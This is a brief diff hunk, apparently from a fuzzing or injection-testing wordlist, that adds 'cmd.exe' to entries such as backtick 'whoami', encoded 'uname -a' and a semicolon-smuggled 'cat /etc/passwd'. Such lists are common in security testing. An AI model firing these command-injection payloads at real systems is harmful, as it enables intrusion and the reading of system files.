@@ -20,6 +20,7 @@ $null
 `whoami`
 uname%20-a
 %3Bcat%20/etc/passwd
+cmd.exe
 %3d
 %25
 &#37
